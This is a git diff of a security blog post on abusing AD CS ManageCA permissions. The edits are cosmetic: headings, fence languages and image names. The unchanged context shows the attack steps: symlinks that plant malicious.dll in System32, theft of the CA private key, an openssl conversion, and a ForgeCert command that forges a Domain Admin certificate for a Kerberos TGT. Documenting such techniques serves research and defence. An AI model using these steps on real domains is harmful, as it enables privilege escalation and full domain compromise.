@@ -230,33 +230,33 @@ To release the OpLock, simply press the Enter key in the SetOpLock.exe console. 
 
 Before this step:
 
-```cmd
+```powershell
 # Before this step:
 TMP file  : C:\Workspace\Mountpoint\pre63F0.tmp -> C:\Workspace\Bait\pre63F0.tmp
 Dest file : C:\Workspace\MountPoint\target.txt -> C:\Workspace\Bait\target.txt
 ```
 
-<img src="/assets/posts/2023-12-03-ad-cs-new-ways-to-abuse-manageca-permissions/image-20231203190158638.png" alt="image-20231203190158638" style="zoom:67%;" />
+<img src="/assets/posts/2023-12-03-ad-cs-new-ways-to-abuse-manageca-permissions/before.png" alt="before" style="zoom:67%;" />
 
 We switch the mountpoint and create the symbolic links:
 
-```cmd
+```powershell
 C:\Workspace\MountPoint\ -> \RPC Control
 Symlink 1: \RPC Control\pre63F0.tmp -> C:\Workspace\malicious.dll
 Symlink 2: \RPC Control\target.txt -> C:\Windows\System32\malicious.dll
 ```
 
-<img src="/assets/posts/2023-12-03-ad-cs-new-ways-to-abuse-manageca-permissions/image-20231203190111476.png" alt="image-20231203190111476" style="zoom:67%;" />
+<img src="/assets/posts/2023-12-03-ad-cs-new-ways-to-abuse-manageca-permissions/after.png" alt="after" style="zoom:67%;" />
 
 After this step:
 
-```cmd
+```powershell
 # After this step:
 TMP file  : C:\Workspace\MountPoint\pre63F0.tmp -> C:\Workspace\malicious.dll
 Dest file : C:\Workspace\MountPoint\target.txt -> C:\Windows\System32\malicious.dll
 ```
 
-<img src="/assets/posts/2023-12-03-ad-cs-new-ways-to-abuse-manageca-permissions/image-20231203185953148.png" alt="image-20231203185953148" style="zoom:67%;" />
+<img src="/assets/posts/2023-12-03-ad-cs-new-ways-to-abuse-manageca-permissions/end" alt="end" style="zoom:67%;" />
 
 This step can be accomplished by executing the following powershell cmdlet:
 
@@ -297,7 +297,7 @@ The CA signs the issued certificate using its private key. If we steal this priv
 
 Later, Specterops discussed this topic again in its white paper and released a [ForgeCert](https://github.com/GhostPack/ForgeCert) tool, which is a C# tool that can obtain the CA root certificate and provide us with Forge new certificates for any user specified. This technology is called “Golden Certificates”.
 
-### Steal CA's Certificate & Private Key
+**(1) Steal CA's certificate & private Key**
 
 Since we have elevated privileges on the AD CS server, we are fully able to retrieve and export the CA certificate and its private key on the server. This process can be accomplished through the [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI) toolset as shown below.
 
@@ -315,7 +315,7 @@ We can use openssl to convert this .pem formatted text into exploitable .pfx for
 openssl pkcs12 -in ca.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out ca.pfx
 ```
 
-### Forged Certificate for Domain Admins 
+**(2) Forged certificate for domain admins**
 
 With this ca.pfx file containing the CA certificate and private key, an attacker can upload it to a regular domain machine and use it to forge certificates. Here we use the [ForgeCert](https://github.com/GhostPack/ForgeCert) tool to complete this process. Execute the following command to register the certificate for the domain admins user Administrator through the previously stolen ca.pfx.
 
@@ -325,7 +325,7 @@ ForgeCert.exe --CaCertPath ca.pfx --CaCertPassword "Passw0rd" --Subject "CN=User
 
 ![image-20231121104230365](/assets/posts/2023-12-03-ad-cs-new-ways-to-abuse-manageca-permissions/image-20231121104230365.png)
 
-### Get TGT for Domain Admins
+**(3) Get TGT for domain admins**
 
 The resulting Administrator.pfx can be used for Kerberos PKINIT authentication and forging a user requesting a TGT as shown below.
 
